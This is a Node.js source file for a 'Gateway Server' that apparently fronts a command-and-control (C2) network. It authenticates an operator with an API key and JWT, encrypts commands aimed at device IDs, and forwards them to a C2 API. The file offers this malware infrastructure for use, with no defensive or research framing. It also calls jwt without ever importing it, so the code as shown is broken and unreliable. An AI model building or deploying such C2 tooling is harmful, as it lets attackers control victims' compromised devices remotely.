const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const crypto = require('crypto');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(helmet());
app.use(express.json());
app.use(express.static('public'));

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex').slice(0, 32);
const C2_API_URL = process.env.C2_API_URL || 'http://c2-server:10000/api';
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});
app.use('/api/', limiter);

function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'utf8'), iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag().toString('hex');
    return JSON.stringify({ iv: iv.toString('hex'), encrypted, authTag });
}

function decrypt(encryptedData) {
    const { iv, encrypted, authTag } = JSON.parse(encryptedData);
    const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'utf8'), Buffer.from(iv, 'hex'));
    decipher.setAuthTag(Buffer.from(authTag, 'hex'));
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    if (!token) return next(new Error('Authentication error'));
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        socket.userId = decoded.userId;
        next();
    } catch (err) {
        next(new Error('Invalid token'));
    }
});

io.on('connection', (socket) => {
    console.log('Operator connected to dashboard');
    socket.on('send_command', async (data) => {
        try {
            if (!data.deviceId || !data.command) {
                socket.emit('command_error', 'Invalid command data');
                return;
            }
            const encryptedPayload = encrypt(JSON.stringify(data));
            const response = await axios.post(`${C2_API_URL}/commands`, {
                deviceId: data.deviceId,
                payload: encryptedPayload
            });
            socket.emit('command_sent', { status: 'success', id: response.data.id });
        } catch (error) {
            console.error('Error forwarding command to C2:', error.message);
            socket.emit('command_error', 'Failed to send command');
        }
    });
});

app.post('/api/authenticate', (req, res) => {
    const { apiKey } = req.body;
    if (apiKey === process.env.API_KEY) {
        const token = jwt.sign({ userId: 'operator' }, JWT_SECRET, { expiresIn: '1h' });
        res.json({ token });
    } else {
        res.status(401).json({ error: 'Invalid API key' });
    }
});

server.listen(3000, () => {
    console.log('Gateway Server running on port 3000');
});